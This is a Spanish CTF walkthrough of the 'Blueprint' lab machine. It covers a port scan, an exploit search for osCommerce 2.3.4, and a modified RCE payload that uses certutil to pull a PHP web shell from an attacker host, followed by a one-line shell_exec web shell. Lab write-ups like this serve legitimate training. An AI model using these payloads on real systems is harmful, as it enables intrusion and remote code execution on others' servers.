# Blueprint

## Initial Scan
```
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 404 - File or directory not found.
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
```
## Enum 
### HTTP 8080
Nada mas entrar vemos una carpeta de oscommerce2.3.4, buscamos vuln para la versión de osCommerce 
```
----------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                   |  Path
----------------------------------------------------------------------------------------------------------------- ---------------------------------
osCommerce 2.3.4 - Multiple Vulnerabilities                                                                      | php/webapps/34582.txt
osCommerce 2.3.4.1 - 'currency' SQL Injection                                                                    | php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection                                                                 | php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                                                                  | php/webapps/46330.txt
osCommerce 2.3.4.1 - Arbitrary File Upload                                                                       | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution                                                                       | php/webapps/44374.py
----------------------------------------------------------------------------------------------------------------- ---------------------------------
```
El último tiene bastante buena pinta, veamos si cumplimos los requisitos
Podemos acceder a :
```
http://10.10.190.54:8080/oscommerce-2.3.4/catalog/install/
```
Asi que podemos ejecutar el exploit, cambiando el payload por el siguiente:
```
payload = '\');'
payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.9.95.54:8000/php-cmd-exec-win.php shellwin.php & nslookup test IP " );'
payload += 'echo $var;/*'

```
La shell se sube sin problemas pero tenemos un pequeño problema
```
Warning: system() has been disabled for security reasons in C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes\shell.php on line 1
```
Cambiamos la usual a una que no use system si no shell_exec
```
<?php echo shell_exec($_GET["cmd"]); ?>
```
Con esto ya tenemos RCE desde el navegador tocaria pasarlo a una rev shell para leer las flags
